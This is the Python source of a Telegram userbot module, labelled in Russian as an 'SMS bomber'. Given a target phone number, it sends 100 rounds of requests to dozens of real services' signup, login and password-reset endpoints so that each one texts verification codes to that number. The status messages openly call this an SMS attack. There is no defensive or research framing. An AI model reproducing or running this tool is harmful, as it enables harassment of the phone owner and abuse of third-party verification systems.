import requests
import random
from .. import loader, utils

class BombMod(loader.Module):
    """SMS бомбер"""

    strings = {"name": "yg_bomb"}

    async def bombcmd(self, message):
        """<номер телефона>"""
        if utils.get_args_raw(message):
            try:
                phone = utils.get_args_raw(message)
                if phone.startswith('+'):
                    phone = phone[1:]
                if phone.startswith('8'):
                    phone = '7' + phone[1:]
                if phone.startswith('9'):
                    phone = '7' + phone
                await message.edit(f"<b><emoji document_id=5348140027698227662>🙀</emoji> SMS атака на номер <code>{phone}</code> началась</b>")
            except:
                await message.edit("<b><emoji document_id=5348140027698227662>🙀</emoji> Неправильный формат номера телефона!</b>")
                return

            success_count = 0
            total_count = 0
            iteration = 0

            while total_count < 100:
                try:
                    _name = ''
                    for x in range(12):
                        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
                    password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
                    username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
                    passmegafon = random.choice(list('123456789'))

                    _phone9 = phone[1:]
                    _phoneAresBank = '+' + phone[0] + '(' + phone[1:4] + ')' + phone[4:7] + '-' + phone[7:9] + '-' + phone[9:11]
                    _phone9dostavista = _phone9[:3] + '+' + _phone9[3:6] + '-' + _phone9[6:8] + '-' + _phone9[8:10]
                    _phoneOstin = '+' + phone[0] + '+(' + phone[1:4] + ')' + phone[4:7] + '-' + phone[7:9] + '-' + phone[9:11]
                    _phonePizzahut = '+' + phone[0] + ' (' + phone[1:4] + ') ' + phone[4:7] + ' ' + phone[7:9] + ' ' + phone[9:11]
                    _phoneGorzdrav = phone[1:4] + ') ' + phone[4:7] + '-' + phone[7:9] + '-' + phone[9:11]

                    _email = _name + f'{iteration}' + '@gmail.com'
                    email = _name + f'{iteration}' + '@gmail.com'

                    requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
                    requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
                    requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': phone}, headers={})
                    requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone}, headers={})
                    requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone}, headers={})
                    requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + phone}, headers={})
                    requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': phone}, headers={})
                    requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone})
                    requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut, '_token': '*'})
                    requests.post('https://www.rabota.ru/remind', data={'credential': phone})
                    requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + phone})
                    requests.post('https://www.citilink.ru/registration/confirm/phone/+' + phone + '/')
                    requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name, 'phone': phone, 'promo': 'yellowforma'})
                    requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
                    requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false', 'fromRegisterPage': 'true', 'snLogin': '', 'bpg': '', 'snProviderId': ''}, data={'phone': phone, 'g-recaptcha-response': '', 'recaptcha': 'on'})
                    requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': phone, 'typeKeys': ['Unemployed']}}, 'query': 'mutation registration($client: ClientInput!) {\n  registration(client: $client) {\n    token\n    __typename\n  }\n}\n'})
                    requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone})
                    requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': f"{email}@gmail.ru", 'mobile_phone': phone, 'deliveryOption': 'sms'})
                    requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': phone})
                    requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика', 'params': {'phone': phone}, 'id': '1'})
                    requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName': 'Иван', 'middleName': 'Иванович', 'lastName': 'Иванов', 'sex': '1', 'birthDate': '10.10.2000', 'mobilePhone': _phone9, 'russianFederationResident': 'true', 'isDSA': 'false', 'personalDataProcessingAgreement': 'true', 'bKIRequestAgreement': 'null', 'promotionAgreement': 'true'})
                    requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone})
                    requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone})
                    requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + phone})
                    requests.post("https://api.carsmile.com/", json={"operationName": "enterPhone", "variables": {"phone": phone}, "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
                    requests.post('https://www.citilink.ru/registration/confirm/phone/+' + phone + '/')
                    requests.post("https://api.delitime.ru/api/v2/signup", data={"SignupForm[username]": phone, "SignupForm[device_type]": 3})
                    requests.get('https://findclone.ru/register', params={'phone': '+' + phone})
                    requests.post("https://guru.taxi/api/v1/driver/session/verify", json={"phone": {"code": 1, "number": phone}})
                    requests.post('https://icq.com/smsreg/requestPhoneValidation.php', data={'msisdn': phone, "locale": 'en', 'countryCode': 'ru', 'version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
                    requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru", data={"mode": "request", "phone": "+" + phone, "phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
                    requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + phone})
                    requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": phone})
                    requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": phone})
                    requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + phone})
                    requests.post('https://cloud.mail.ru/api/v2/notify/applink', json={"phone": "+" + phone, "api": 2, "email": "email", "x-email": "x-email"})
                    requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode', params={"pageName": "registerPrivateUserPhoneVerificatio"}, data={"phone": phone, "recaptcha": 'off', "g-recaptcha-response": ""})
                    requests.post('https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone', data={"st.r.phone": "+" + phone})
                    requests.post('https://plink.tech/register/', json={"phone": phone})
                    requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": phone})
                    requests.post("http://smsgorod.ru/sendsms.php", data={"number": phone})
                    requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone})
                    requests.post('https://passport.twitch.tv/register?trusted_request=true', json={"birthday": {"day": 11, "month": 11, "year": 1999}, "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True, "password": password, "phone_number": phone, "username": username})
                    requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': phone}, headers={'App-ID': 'cabinet'})
                    requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": phone, "type": 2})
                    requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": "+" + phone})
                    requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone})
                    requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': f"{email}@gmail.ru", 'mobile_phone': phone, 'deliveryOption': 'sms'})
                    requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": phone})
                    requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": phone})
                    requests.post('https://bmp.megafon.tv/api/v10/auth/register/msisdn', json={"msisdn": phone, "password": passmegafon})
                    success_count += 1
                except:
                    pass

                total_count += 1
                iteration += 1

                if total_count % 10 == 0:
                    await message.edit(f"<b><emoji document_id=4988080790286894217>🫥</emoji> SMS атака в процессе..\n\n<emoji document_id=5348140027698227662>🙀</emoji> Выполенено <code>{total_count}</code> запросов из <code>100</code></b>")

        else:
            await message.edit("<b><emoji document_id=5348140027698227662>🙀</emoji> Укажите номер телефона</b>")
            return

        await message.edit(f"<b><emoji document_id=5348140027698227662>🙀</emoji> SMS атака на номер <code>{phone}</code> завершена</b>")